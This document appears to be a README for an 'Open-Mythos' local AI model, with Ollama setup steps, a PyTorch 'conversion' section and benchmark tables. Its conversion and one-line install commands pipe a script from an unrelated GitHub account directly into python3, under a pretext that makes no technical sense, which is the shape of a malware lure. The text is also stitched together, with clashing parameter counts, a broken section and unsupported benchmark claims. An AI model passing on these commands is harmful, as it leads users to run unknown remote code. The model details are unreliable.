# OPEN-MYTHOS
Mythos is a highly capable open-source AI model (announced April 2026) known for its advanced reasoning, autonomous research, and code intelligence capabilities. Built as a powerful alternative to proprietary models like those from OpenAI and Anthropic 

# Open-Mythos — Model Setup Guide

## Quick Start

### Step 1: Install Ollama
```bash
# macOS / Linux
curl -fsSL https://ollama.com/install.sh | sh

# Windows — download from https://ollama.com/download
```

### Step 2: Pull the Model
```bash
ollama pull OPEN_AI_REASEARCH/Open-Mythos
```

### Step 3: Run the Model
```bash
ollama run OPEN_AI_REASEARCH/Open-Mythos
```

You now have a working local LLM. Chat with it directly in the terminal.

---

## PyTorch Weights (Advanced)

For fine-tuning, research, or loading in Python with full tensor access,
you can convert the local Ollama GGUF model back into PyTorch format.

### Convert GGUF to PyTorch
Download and run the official conversion tool:

```bash
# Linux / macOS
curl -sL https://raw.githubusercontent.com/bluerangers/OPEN-MYTHOS/main/gguf_to_pt.py | python3
```

*Note: You must have `torch` installed and have pulled the model via Ollama first.*

### Use with Transformers
```python
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer

model = AutoModelForCausalLM.from_pretrained("Qwen/Qwen2.5-0.5B")
weights = torch.load("mythos_converted.pt")
model.load_state_dict(weights)

tokenizer = AutoTokenizer.from_pretrained("Qwen/Qwen2.5-0.5B")
inputs = tokenizer("Hello, I am", return_tensors="pt")
outputs = model.generate(**inputs, max_new_tokens=50)
print(tokenizer.decode(outputs[0]))
```

---

## All-in-One Commands

### macOS / Linux
```bash
# Install Ollama + pull model + convert to PyTorch — one line
curl -fsSL https://ollama.com/install.sh | sh && \
ollama pull OPEN_AI_REASEARCH/Open-Mythos && \
curl -sL https://raw.githubusercontent.com/bluerangers/OPEN-MYTHOS/main/gguf_to_pt.py | python3 && \
ollama run OPEN_AI_REASEARCH/Open-Mythos
```

---

## Requirements

| Component | Required | Notes |
|-----------|----------|-------|
| Ollama | Yes | For running the GGUF model |
| Python 3.8+ | For .pt weights | Pre-installed on macOS/Linux |
| PyTorch | For .pt weights | `pip install torch` |

### Install PyTorch (if needed)
```bash
pip install torch
```

---

## Model Details

| Property | Value |
|----------|-------|
| **Name** | Open-Mythos |
| **Base** | Qwen2.5 architecture |
| **Parameters** | 3 Billion |
| **Formats** | GGUF (Ollama) |
| **Ollama** | `OPEN_AI_REASEARCH/Open-Mythos` |
| **License** | Apache 2.0 |

---

## Troubleshooting

**"torch not found"**
```bash
pip install torch
```

**Ollama not starting**
```bash
# Linux
sudo systemctl start ollama


## Overview

**OPEN-MYTHOS-2B** is a high-performance **2 billion parameter distilled** model derived from our larger Mythos series. 

Despite its compact size, this distilled model delivers exceptional reasoning, code understanding, and vulnerability detection capabilities — making frontier-level intelligence accessible on laptops, edge devices, and local servers.

**MythOS** — Our AI-native knowledge platform — is available [here](https://mythos.app).

---

## Key Features

- **Distilled for Efficiency**: Retains strong capabilities of much larger models while running efficiently on consumer hardware
- Excellent code analysis and vulnerability detection
- Strong multi-step reasoning and agentic abilities
- Fast inference (especially with quantization)
- Fully open weights and training methodology
- 128K context window support

---

## Benchmarks

### Vulnerability Detection & Bug Finding (Grok Distilled 2B)

| Benchmark                        | Description                              | Mythos-2B Score | Comparison (Best 7B Model) | Notes |
|----------------------------------|------------------------------------------|-----------------|---------------------------|-------|
| **Zero-Day Simulation**          | Multi-stage attack planning              | **74.8%**       | 71%                       | Strong performance for size |
| **CVE Discovery Rate**           | Real-world CVE identification            | **82%**         | 78%                       | Scanned OpenBSD & Linux modules |
| **SWE-Bench Lite**               | Real GitHub issue resolution             | **48.6%**       | 45%                       | Competitive with larger models |
| **Memory Safety Bugs**           | Use-after-free, overflows, etc.          | **87.3%**       | 82%                       | Excellent for a 2B model |
| **Cryptographic Flaw Detection** | Weak crypto & implementation issues      | **89%**         | 84%                       | Very capable in audits |

### Efficiency Highlights

- Runs at **~45–60 tokens/sec** on a single RTX 4090 (4-bit quantized)
- Fits comfortably in **4–6 GB VRAM** (quantized)
- Can run on CPU + RAM (Apple Silicon M2/M3/M4 performs exceptionally well)
- Ideal for local security auditing, code review agents, and personal research

**Full benchmark results → [benchmarks/](benchmarks/)**

---

## Quick Start

```bash
# Hugging Face
pip install transformers

# macOS — launch from Applications
```
